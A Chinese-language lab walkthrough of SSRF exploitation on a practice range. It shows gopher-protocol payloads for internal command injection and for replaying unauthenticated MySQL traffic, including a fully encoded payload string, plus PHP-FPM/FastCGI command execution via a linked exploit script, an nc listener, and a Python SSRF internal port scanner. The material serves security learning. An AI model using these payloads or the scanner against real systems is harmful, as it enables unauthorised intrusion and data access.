
首先这是靶场整个的拓扑图

![p](../img/ssrf-vuls%20靶场实践/IMG-20260925164813367.png)

### 命令注入攻击

#### POST 数据包构造
由于 ssrf 前端只支持提交 GET 请求。因此我们采用 Gopher 协议来提交 POST 数据包。
首先先随意构造一个 POST 请求，主要修改 host 和 origin 还有 referer 字段为要攻击的内网主机 IP。然后删除这一行。

```http
Accept-Encoding: gzip, deflate
```


最后通过 burp 计算我们的数据包内容的大小，修改 Content-Length的大小。至此一个攻击数据包已经完成了。

![s](../img/ssrf-vuls%20靶场实践/IMG-20260925204402435.png)

#### 使用 Burp suite 重放攻击

我要对数据包进行两次 url 编码，主要 gopher协议一定要指明目标的端口，因为不指定，默认只会重放到 70 端口。然后数据包一定要空一位。
比如这里
```
http://10.10.10.160/ssrf.php?url=gopher://10.10.10.160:9000/_%2501
```
%25 前扣了位置放 “\_”。


![s1](../img/ssrf-vuls%20靶场实践/IMG-20260925204803927.png)

![s2](../img/ssrf-vuls%20靶场实践/IMG-20260925205011689.png)

## MySQL 未授权登录

MySQL数据库在登陆过程中，如果不采用密码认证，则只需要使用 TCP 套接字就可以登录了。这给我们使用 SSRF 漏洞，利用用 gopher 协议操作数据库提供了可能性。

首先，我们需要抓取 3306 端口的流量。使用 tcpdump 工具获取操作过程流量。打开数据库，进行操作。

![p1](../img/ssrf-vuls%20靶场实践/IMG-20260925165821593.png)

![p2](../img/ssrf-vuls%20靶场实践/IMG-20260925165939412.png)

我们进行了查表操作。当我们使用 gopher 协议重放MySQL 流量时，就会执行我先前执行过的查表操作。并且把页面以 SSRF 漏洞请求结果展示到前端页面。

打开我们抓取的 mysql 数据包。点击 TCP 流追踪，选择客户端发往服务端的流量。

![p3](../img/ssrf-vuls%20靶场实践/IMG-20260925172230853.png)

![p4](../img/ssrf-vuls%20靶场实践/IMG-20260925172245501.png)

![p5](../img/ssrf-vuls%20靶场实践/IMG-20260925172256675.png)


我们转换成 raw 格式。接下来我需要通过 python 对流量进行二次 url 编码。因为 burp 发送一次，服务端 curl 也要发送一次。可以使用 burp 自带的 url 全部格式编码。

这里我们使用 python 交换命令行操作。

![p6](../img/ssrf-vuls%20靶场实践/IMG-20260925172924106.png)

```python
data = open("mysql.bin",'rb').read()
from urllib import parse
res = parse.quote(data)
dt='gopher://172.72.23.29:3306/_'+res
>>> dt = parse.quote(dt)
>>> dt
'gopher%3A//172.72.23.29%3A3306/_%253C%2500%2500%2501%2505%25A2%250F%2500%2500%2500%2500%2501%2508%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500root%2500%2500mysql_native_password%2500%2521%2500%2500%2500%2503select%2520%2540%2540version_comment%2520limit%25201%253D%2500%2500%2500%2503select%2520%252A%2520from%2520flag.test%2520union%2520select%2520user%2528%2529%252C%2527www.sqlsec.com%2527%2501%2500%2500%2500%2501'
```

执行成功，我们可以看到回显。

![p7](../img/ssrf-vuls%20靶场实践/IMG-20260925173315958.png)


## FPM 任意命令执行

复现这个环境，我采用本地搭建 nginx + php7.4 来实现。具体参考了这篇文章，[FPM](https://joner11234.github.io/article/9897b513.html)
为了方便，本次都是直接在目标靶机上抓取流量。在实际过程中，为了方便，采用静态编译工具获取流量，比如 socat 和 tcpdump等。这里记录一下一个 github 库，里面有已经编译好的工具。
[static-binaries](https://github.com/andrew-d/static-binaries)

### 什么是 FPM ？

FPM 就是 php 用于管理 FastCGI 的进程管理工具。也就是 php 的 FastCGI 实现。

### 攻击验证

这里如果把 auto_prepend_file 改成 php://input 。那么在每个文件执行前，会包含 POST 数据。

![poc](../img/ssrf-vuls%20靶场实践/IMG-20260925203235549.png)


### 攻击流程

当前的攻击流程是，先通过开源的脚本，抓取 web 服务器向 php 解释器执行命令的请求。当前这个请求是通过 FastCGI 这个协议发送出去的。我们只需监听一个端口，让请求流量经过该端口，就能构造数据包。

![p8](../img/ssrf-vuls%20靶场实践/IMG-20260925201001975.png)



![p9](../img/ssrf-vuls%20靶场实践/IMG-20260925201121746.png)


![p10](../img/ssrf-vuls%20靶场实践/IMG-20260925201213106.png)



首先，我们需要下载利用脚本，[FastCGI](https://gist.githubusercontent.com/phith0n/9615e2420f31048f7e30f3937356cf75/raw/ffd7aa5b3a75ea903a0bb9cc106688da738722c5/fpm.py)
先执行一次，抓取执行 uname -a 这条命令的流量。实际上，为了演示效果的清晰，后续的攻击流量改为执行 id 命令。

![p11](../img/ssrf-vuls%20靶场实践/IMG-20260925202434289.png)

在目标靶机本地，起一个监听端口1234。按照上述命令的，将端口改成 1234。

```shell
sudo nc -lvnp 1234 > fpm_8888
```

使用 python 进行数据提取处理。将处理结果贴到 burp，然后使用进行第二次 url 编码。

![p12](../img/ssrf-vuls%20靶场实践/IMG-20260925203020719.png)

可以看到成功执行了我们的命令。

![p13](../img/ssrf-vuls%20靶场实践/IMG-20260925203106257.png)



最后分享一个 ssrf 内网探测的脚本吧！

```python

# encoding :utf-8

import requests as req
import time
ports = ['80','3306','6379','8080','8000']
session = req.Session()
for i in xrange(255):
   ip = '172.72.23.%d' % i
   for port in ports:
      url = 'http://10.10.10.160/?url=http://%s:%s' % (ip,port)
      try:
         res = session.get(url,timeout=3)
         if len(res.content) > 0:
            print ip, port, 'is open'
      except:
         continue
print 'DONE'

```
实际要根据响应调整脚本。

